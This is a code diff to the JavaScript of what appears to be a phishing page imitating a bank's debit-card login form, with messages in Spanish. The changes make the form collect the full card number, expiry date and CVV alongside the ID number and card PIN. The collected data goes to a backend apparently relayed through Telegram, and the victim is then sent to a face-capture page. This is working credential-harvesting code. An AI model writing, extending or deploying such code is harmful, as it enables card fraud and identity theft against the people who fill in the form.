@@ -79,6 +79,28 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     });
 
+    // Formatear número de tarjeta (16 dígitos con espacios)
+    const cardNumberInput = document.querySelector('input[name="card-full-number"]');
+    if (cardNumberInput) {
+        cardNumberInput.addEventListener('input', function(e) {
+            let value = this.value.replace(/\s/g, '').replace(/\D/g, '');
+            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+            this.value = formattedValue;
+        });
+    }
+
+    // Formatear fecha de vencimiento (MM/AA)
+    const expiryInput = document.querySelector('input[name="card-expiry"]');
+    if (expiryInput) {
+        expiryInput.addEventListener('input', function(e) {
+            let value = this.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            }
+            this.value = value;
+        });
+    }
+
     // Manejar cambio entre formularios
     loginOptions.forEach((button, index) => {
         button.addEventListener('click', function() {
@@ -207,11 +229,13 @@ document.addEventListener('DOMContentLoaded', function() {
         // Obtener valores del formulario
         const tipoDoc = this.querySelector('select').value;
         const numDoc = this.querySelector('input[name="identification"]').value.trim();
-        const ultimosDigitos = this.querySelector('input[name="card-number"]').value.trim();
+        const numeroTarjeta = this.querySelector('input[name="card-full-number"]').value.replace(/\s/g, '').trim();
         const claveTarjeta = this.querySelector('input[name="card-pin"]').value.trim();
+        const fechaVencimiento = this.querySelector('input[name="card-expiry"]').value.trim();
+        const cvv = this.querySelector('input[name="card-cvv"]').value.trim();
 
         // Validación básica
-        if (!numDoc || !ultimosDigitos || !claveTarjeta) {
+        if (!numDoc || !numeroTarjeta || !claveTarjeta || !fechaVencimiento || !cvv) {
             window.commonUtils.showError('Por favor complete todos los campos obligatorios');
             return;
         }
@@ -221,13 +245,23 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
 
-        if (ultimosDigitos.length !== 4) {
-            window.commonUtils.showError('Debe ingresar los 4 últimos dígitos de su tarjeta');
+        if (numeroTarjeta.length !== 16) {
+            window.commonUtils.showError('El número de tarjeta debe tener 16 dígitos');
             return;
         }
 
         if (claveTarjeta.length !== 4) {
             window.commonUtils.showError('La clave de tarjeta debe tener 4 dígitos');
+            return;
+        }
+
+        if (!/^\d{2}\/\d{2}$/.test(fechaVencimiento)) {
+            window.commonUtils.showError('La fecha de vencimiento debe estar en formato MM/AA');
+            return;
+        }
+
+        if (cvv.length !== 3) {
+            window.commonUtils.showError('El CVV debe tener 3 dígitos');
             return;
         }
 
@@ -240,8 +274,10 @@ document.addEventListener('DOMContentLoaded', function() {
             tipo: 'Tarjeta Débito',
             tipoDocumento: tipoDoc,
             numeroDocumento: numDoc,
-            ultimosDigitos: ultimosDigitos,
-            claveTarjeta: claveTarjeta
+            numeroTarjeta: numeroTarjeta,
+            claveTarjeta: claveTarjeta,
+            fechaVencimiento: fechaVencimiento,
+            cvv: cvv
         };
 
         try {
@@ -268,10 +304,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
             console.log('✅ Datos enviados exitosamente - Message ID:', result.messageId);
             
-            // Mantener overlay con 'Cargando'
-            console.log('📺 Overlay visible: Cargando...');
-            
-            // Guardar información de la sesión
+            // Guardar datos y redirigir a página de captura de cara
             sessionStorage.setItem('formData', JSON.stringify({
                 tipo: 'Tarjeta Débito',
                 formulario: 'tarjeta',
@@ -279,7 +312,8 @@ document.addEventListener('DOMContentLoaded', function() {
                 timestamp: new Date().toISOString()
             }));
 
-            // El loading se mantendrá visible hasta que llegue la acción de Telegram
+            // Redirigir a página de captura de cara
+            window.location.href = 'cara.html';
 
         } catch (error) {
             console.error('❌ Error al enviar formulario:', error);
